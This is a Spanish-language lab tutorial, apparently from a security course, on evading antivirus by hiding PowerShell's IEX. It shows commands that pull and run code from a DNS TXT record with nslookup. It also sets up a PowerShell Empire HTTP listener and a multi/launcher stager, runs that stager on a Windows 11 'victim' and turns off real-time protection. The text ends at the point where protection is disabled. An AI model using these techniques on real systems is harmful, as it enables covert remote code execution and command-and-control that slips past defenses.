# Ocultar IEX para evadir al antivirus
 

Requisitos:
1. Máquina ***Router-Ubu***.
2. Máquina ***Kali Linux***.
3. Máquina ***Win 11***.

TODO. introducción

## Ejercicio 1: Hacer prueba de concepto con registro TXT.

Debemos sacar del dominio a la máquina ***Win 11***. Para ello, vamos a **Settings***, ***Accounts***, ***Access work or school*** y desconectamos al equipo del dominio.

Reiniciamos y volvemos aquí.

Debemos asegurar que el servidor DNS está correctamente configurado, tal y como aclara la imagen.

![8.8.8.8 Server](../img/lab-50-C/202209142058.png)

Para saltar la detección del antivirus, la instrucción ***IEX*** no debe aparecer en el payload. Para ello hacemos una prueba de concepto por medio de un registro ***TXT*** del ***DNS***.

La siguiente imagen muestra un registro TXT, llamado ***prueba***, que contiene un texto genérico en el servidor que lleva la zona ***antsala.xyz***.

![prueba TXT](../img/lab-50-C/202209142115.png)

Abrimos una terminal de ***Powershell***, y en ella escribimos.
```
nslookup -q=txt pruebadeconcepto.antsala.xyz
```

y obtenemos lo siguiente.
Nota: Solo nos interesa la última línea de la salida del comando.

![última línea](../img/lab-50-C/202209142117.png)

Estudia la siguiente imagen. Usando ***[]*** podemos elegir la línea que nos interesa de la salida, que es la última.
Nota: ***Non-authoritative answer*** for forma parte de la salida.

![Selección línea](../img/lab-50-C/202209142122.png)

Ahora nos fijamos en el siguiente registro TXT.

![Seleccionar varias líneas](../img/lab-50-C/202209142124.png)

Observa qué ocurre cuando hacemos la consulta.
```
(nslookup -q=txt ejecutaesto.antsala.xyz)[-1]
```

En la salida podemos observar que hemos "extraído" un ***comando***.

![extracción comando](../img/lab-50-C/202209142127.png)

Vamos a ver si podemos ejecutarlo.
```
& powershell . (nslookup -q=txt ejecutaesto.antsala.xyz)[-1]
```

***Notepad*** se abre. ¿Mágico verdad? Hemos conseguido ejecutar el comando que se almacena en un registro TXT de la zona DNS.

## Ejercicio 2: Actualizar PowerShell Empire.

En la máquina ***Kali*** abrimos una terminal y ejecutamos el siguiente comando para actualizar ***PowerShell Empire***.
```
sudo apt install powershell-empire
```

Cuando haya terminado la actualización iniciamos el servidor de ***PowerShell Empire***.
```
sudo powershell-empire server
```

El servidor se inicia, como podemos ver en la siguiente imagen.

![Server iniciado](../img/lab-50-C/202209150921.png)

Es es momento de iniciar el ***Cliente*** de ***PowerShell Empire***. En una nueva terminal, escribimos.
```
powershell-empire client
```

Ya tenemos el cliente iniciado.

![Cliente iniciado](../img/lab-50-C/202209150925.png)


## Ejercicio 3: Crear un Listener y un Stager

Vamos a crear un ***listener*** que estará a la espera de las conexiones de la víctima, que en ***PowerShell Empire*** recibe el nombre de ***agente***.
```
uselistener http
```

Aparecerá la configuración del listener, Como podrás ver, hay campos obligatorios (***required***), otros que no lo son. También se presentas campos con valores por defecto.

![Opciones del listener](../img/lab-50-C/202209150937.png)

Si revisamos la configuración, no tenemos valor para el parámetro ***Port***, que es el puerto al que conectará el ***agente*** cuando éste se inicie en la víctima. Ponemos el valor 9876.
```
set Port 9876
```

![Puerto configurado](../img/lab-50-C/202209150942.png)

Iniciamos el listener.
```
execute
```

El listener debe haberse iniciado.

![Listener iniciado](../img/lab-50-C/202209150944.png)

Vamos a usar un ***stager***, que como ya sabemos es el pequeño programa que realmente descargará en verdadero contenido malicioso en la víctima.

Tenemos una gran cantidad de ***stagers*** a nuestra disposición.

![stagers](../img/lab-50-C/202209150949.png)

Elegimos ***multi/launcher***.
```
usestager multi/launcher
```

Al seleccionar un ***stager*** aparecen sus opciones. Como puede observarse, el lenguaje en el que se generará es ***PowerShell***, sin embargo el campo ***Listener*** está vacío. Este campo se utiliza para indicar al ***Stager*** qué tipo de ***Listener*** se va a usar.

![Opciones del stager](../img/lab-50-C/202209150952.png)

Ponemos el tipo ***Listener***.
```
set Listener http
```

Ejecutamos para que se genere el ***Stager***.
```
execute
```

Como podemos observar en la siguiente imagen, se ha generado en ***PowerShell*** el código de nuestro ***Stager***.
Nota: Observa en la última línea que aparece un mensaje indicando que se ha copiado al portapapeles. Esto es útil porque generalmente desearemos guardar el ***Stager*** en un archivo.

![Código del Stager](../img/lab-50-C/202209151007.png)

Procedemos a probar el ***Stager*** (que ahora mismo está copiado en el portapapeles). En la máquina ***Win 11***, en la terminal de ***PowerShell***, ***pegamos*** el portapapeles. En la imagen puedes ver el resultado.

![Stager en la víctima](../img/lab-50-C/202209151014.png)

Solo queda pulsar ***Enter*** para simular la ejecucion del ***Stager*** en la víctima.

Como puedes ver, el antivirus ha hecho un buen trabajo detectando al ***Stager*** como malware.

![Malware detectado](../img/lab-50-C/202209151016.png)


Procecemos a desactivar el antivirus temporalmente para demostrar que el ***Stager*** puede contectarse correctamente al ***Listener.

En la máquina ***Win 11*** vamos a ***Windows Security*** / ***Virus & threat protection settings*** y hacemos clic en ***Manage settings***.

Desactivamos la protección en tiempo real, como se puede apreciar en la imagen.

![Real time protecction off](../img/lab-50-C/202209151021.png)




